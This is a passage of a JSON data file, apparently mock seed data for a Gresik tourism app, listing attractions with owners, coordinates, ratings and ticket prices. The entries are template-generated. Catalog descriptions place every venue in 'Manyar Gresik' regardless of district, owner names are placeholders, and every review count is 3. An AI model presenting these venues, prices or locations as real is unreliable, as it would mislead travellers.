                        "name": "Paket Premium Bukit Kapur",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m259",
                "name": "Makam Bupati Cerme",
                "owner": "Cak Sidayu",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam bupati yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.379298,
                    112.755117
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c259_1",
                        "name": "Tiket / Menu Layanan Makam Bupati",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Bupati Manyar Gresik."
                    },
                    {
                        "id": "c259_2",
                        "name": "Paket Premium Makam Bupati",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m260",
                "name": "Makam Kuno Adipati Benjeng",
                "owner": "Cak Bawean",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa makam kuno adipati yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.062681,
                    112.72469
                ],
                "rating": 5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c260_1",
                        "name": "Tiket / Menu Layanan Makam Kuno Adipati",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Kuno Adipati Manyar Gresik."
                    },
                    {
                        "id": "c260_2",
                        "name": "Paket Premium Makam Kuno Adipati",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m261",
                "name": "Batik Goyor ATBM Balongpanggang",
                "owner": "Cak Ahmad",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa batik goyor atbm yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.164258,
                    112.643616
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c261_1",
                        "name": "Tiket / Menu Layanan Batik Goyor ATBM",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Batik Goyor ATBM Manyar Gresik."
                    },
                    {
                        "id": "c261_2",
                        "name": "Paket Premium Batik Goyor ATBM",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m262",
                "name": "Taman Kota Bertingkat Duduksampeyan",
                "owner": "Cak Budi",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman kota bertingkat yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.370539,
                    112.662945
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c262_1",
                        "name": "Tiket / Menu Layanan Taman Kota Bertingkat",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Kota Bertingkat Manyar Gresik."
                    },
                    {
                        "id": "c262_2",
                        "name": "Paket Premium Taman Kota Bertingkat",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m263",
                "name": "Teater Rakyat Gresik Wringinanom",
                "owner": "Cak Lia",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa teater rakyat gresik yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.090456,
                    112.645787
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c263_1",
                        "name": "Tiket / Menu Layanan Teater Rakyat Gresik",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Teater Rakyat Gresik Manyar Gresik."
                    },
                    {
                        "id": "c263_2",
                        "name": "Paket Premium Teater Rakyat Gresik",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m264",
                "name": "Pusat Karang Bawean Driyorejo",
                "owner": "Cak Roni",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat karang bawean yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.134992,
                    112.725291
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c264_1",
                        "name": "Tiket / Menu Layanan Pusat Karang Bawean",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Karang Bawean Manyar Gresik."
                    },
                    {
                        "id": "c264_2",
                        "name": "Paket Premium Pusat Karang Bawean",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m265",
                "name": "Es Dawet Siwalan Kedamean",
                "owner": "Cak Santi",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.285833,
                    112.713562
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c265_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c265_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m266",
                "name": "Puncak Awan Menganti",
                "owner": "Cak Mega",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.211845,
                    112.66487
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c266_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c266_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m267",
                "name": "Makam Syekh Sidayu",
                "owner": "Cak Cak",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam syekh yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.246447,
                    112.645015
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c267_1",
                        "name": "Tiket / Menu Layanan Makam Syekh",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Syekh Manyar Gresik."
                    },
                    {
                        "id": "c267_2",
                        "name": "Paket Premium Makam Syekh",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m268",
                "name": "Benteng Pertahanan Ujungpangkah",
                "owner": "Cak Mak",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa benteng pertahanan yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.262314,
                    112.608641
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c268_1",
                        "name": "Tiket / Menu Layanan Benteng Pertahanan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Benteng Pertahanan Manyar Gresik."
                    },
                    {
                        "id": "c268_2",
                        "name": "Paket Premium Benteng Pertahanan",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m269",
                "name": "Pengrajin Rebana Hadrah Panceng",
                "owner": "Cak Haji",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa pengrajin rebana hadrah yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.114812,
                    112.681276
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c269_1",
                        "name": "Tiket / Menu Layanan Pengrajin Rebana Hadrah",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Pengrajin Rebana Hadrah Manyar Gresik."
                    },
                    {
                        "id": "c269_2",
                        "name": "Paket Premium Pengrajin Rebana Hadrah",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m270",
                "name": "Taman Pasir Bermain Bungah",
                "owner": "Cak Neng",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman pasir bermain yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.197646,
                    112.620204
                ],
                "rating": 5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c270_1",
                        "name": "Tiket / Menu Layanan Taman Pasir Bermain",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Pasir Bermain Manyar Gresik."
                    },
                    {
                        "id": "c270_2",
                        "name": "Paket Premium Taman Pasir Bermain",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m271",
                "name": "Sanggar Tari Kembang Tambak Bawean",
                "owner": "Cak Warkop",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa sanggar tari kembang yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.43971,
                    112.731569
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c271_1",
                        "name": "Tiket / Menu Layanan Sanggar Tari Kembang",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Sanggar Tari Kembang Manyar Gresik."
                    },
                    {
                        "id": "c271_2",
                        "name": "Paket Premium Sanggar Tari Kembang",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m272",
                "name": "Pusat Lepas Tukik Sangkapura Bawean",
                "owner": "Cak Sejarah",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat lepas tukik yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.08076,
                    112.631502
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c272_1",
                        "name": "Tiket / Menu Layanan Pusat Lepas Tukik",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Lepas Tukik Manyar Gresik."
                    },
                    {
                        "id": "c272_2",
                        "name": "Paket Premium Pusat Lepas Tukik",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m273",
                "name": "Sego Ruwet Kebomas",
                "owner": "Cak Keluarga",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.068145,
                    112.656402
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c273_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c273_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m274",
                "name": "Bukit Kapur Manyar",
                "owner": "Cak Backpacker",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.455926,
                    112.698525
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c274_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c274_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m275",
                "name": "Sentra Zikir Gresik Kota",
                "owner": "Cak Kulineran",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung sentra zikir yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.232369,
                    112.689374
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c275_1",
                        "name": "Tiket / Menu Layanan Sentra Zikir",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Zikir Manyar Gresik."
                    },
                    {
                        "id": "c275_2",
                        "name": "Paket Premium Sentra Zikir",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m276",
                "name": "Monumen Perjuangan Cerme",
                "owner": "Cak Gresik",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa monumen perjuangan yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.233359,
                    112.583339
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c276_1",
                        "name": "Tiket / Menu Layanan Monumen Perjuangan",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Monumen Perjuangan Manyar Gresik."
                    },
                    {
                        "id": "c276_2",
                        "name": "Paket Premium Monumen Perjuangan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m277",
                "name": "Sentra Tenun Sarung Benjeng",
                "owner": "Cak AlunAlun",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa sentra tenun sarung yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.427013,
                    112.572371
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c277_1",
                        "name": "Tiket / Menu Layanan Sentra Tenun Sarung",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Tenun Sarung Manyar Gresik."
                    },
                    {
                        "id": "c277_2",
                        "name": "Paket Premium Sentra Tenun Sarung",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m278",
                "name": "Taman Bunga Indah Balongpanggang",
                "owner": "Cak Ziarah",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman bunga indah yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.172867,
                    112.586156
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c278_1",
                        "name": "Tiket / Menu Layanan Taman Bunga Indah",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Bunga Indah Manyar Gresik."
                    },
                    {
                        "id": "c278_2",
                        "name": "Paket Premium Taman Bunga Indah",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m279",
                "name": "Kerajinan Lampion Damar Kurung Duduksampeyan",
                "owner": "Cak Sidayu",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa kerajinan lampion damar kurung yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.134277,
                    112.601976
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c279_1",
                        "name": "Tiket / Menu Layanan Kerajinan Lampion Damar Kurung",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Kerajinan Lampion Damar Kurung Manyar Gresik."
                    },
                    {
                        "id": "c279_2",
                        "name": "Paket Premium Kerajinan Lampion Damar Kurung",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m280",
                "name": "Kebun Nanas Madu Wringinanom",
                "owner": "Cak Bawean",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa kebun nanas madu yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.379307,
                    112.578236
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c280_1",
                        "name": "Tiket / Menu Layanan Kebun Nanas Madu",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Kebun Nanas Madu Manyar Gresik."
                    },
                    {
                        "id": "c280_2",
                        "name": "Paket Premium Kebun Nanas Madu",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m281",
                "name": "Es Dawet Siwalan Driyorejo",
                "owner": "Cak Ahmad",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.093649,
                    112.598436
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c281_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c281_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m282",
                "name": "Puncak Awan Kedamean",
                "owner": "Cak Budi",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.180629,
                    112.590687
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c282_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c282_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m283",
                "name": "Makam Bupati Menganti",
                "owner": "Cak Lia",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam bupati yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.283902,
                    112.736433
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c283_1",
                        "name": "Tiket / Menu Layanan Makam Bupati",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Bupati Manyar Gresik."
                    },
                    {
                        "id": "c283_2",
                        "name": "Paket Premium Makam Bupati",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m284",
                "name": "Makam Kuno Adipati Sidayu",
                "owner": "Cak Roni",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa makam kuno adipati yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.107854,
                    112.723049
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c284_1",
                        "name": "Tiket / Menu Layanan Makam Kuno Adipati",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Kuno Adipati Manyar Gresik."
                    },
                    {
                        "id": "c284_2",
                        "name": "Paket Premium Makam Kuno Adipati",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m285",
                "name": "Batik Goyor ATBM Ujungpangkah",
                "owner": "Cak Santi",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa batik goyor atbm yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.242175,
                    112.608593
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c285_1",
                        "name": "Tiket / Menu Layanan Batik Goyor ATBM",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Batik Goyor ATBM Manyar Gresik."
                    },
                    {
                        "id": "c285_2",
                        "name": "Paket Premium Batik Goyor ATBM",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m286",
                "name": "Taman Kota Bertingkat Panceng",
                "owner": "Cak Mega",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman kota bertingkat yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.37353,
                    112.619125
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c286_1",
                        "name": "Tiket / Menu Layanan Taman Kota Bertingkat",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Kota Bertingkat Manyar Gresik."
                    },
                    {
                        "id": "c286_2",
                        "name": "Paket Premium Taman Kota Bertingkat",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m287",
                "name": "Teater Rakyat Gresik Bungah",
                "owner": "Cak Cak",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa teater rakyat gresik yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.117022,
                    112.594996
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c287_1",
                        "name": "Tiket / Menu Layanan Teater Rakyat Gresik",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Teater Rakyat Gresik Manyar Gresik."
                    },
                    {
                        "id": "c287_2",
                        "name": "Paket Premium Teater Rakyat Gresik",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m288",
                "name": "Pusat Karang Bawean Tambak Bawean",
                "owner": "Cak Mak",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat karang bawean yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.180533,
                    112.604766
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c288_1",
                        "name": "Tiket / Menu Layanan Pusat Karang Bawean",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Karang Bawean Manyar Gresik."
                    },
                    {
                        "id": "c288_2",
                        "name": "Paket Premium Pusat Karang Bawean",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m289",
                "name": "Sego Ruwet Sangkapura Bawean",
                "owner": "Cak Haji",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.341443,
                    112.564965
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c289_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c289_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m290",
                "name": "Bukit Kapur Kebomas",
                "owner": "Cak Neng",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.251054,
                    112.722761
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c290_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c290_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m291",
                "name": "Makam Syekh Manyar",
                "owner": "Cak Warkop",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam syekh yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.149604,
                    112.602853
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c291_1",
                        "name": "Tiket / Menu Layanan Makam Syekh",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Syekh Manyar Gresik."
                    },
                    {
                        "id": "c291_2",
                        "name": "Paket Premium Makam Syekh",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m292",
                "name": "Benteng Pertahanan Gresik Kota",
                "owner": "Cak Sejarah",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa benteng pertahanan yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.33107,
                    112.556745
                ],
                "rating": 4.7,
                "reviewsCount": 3,
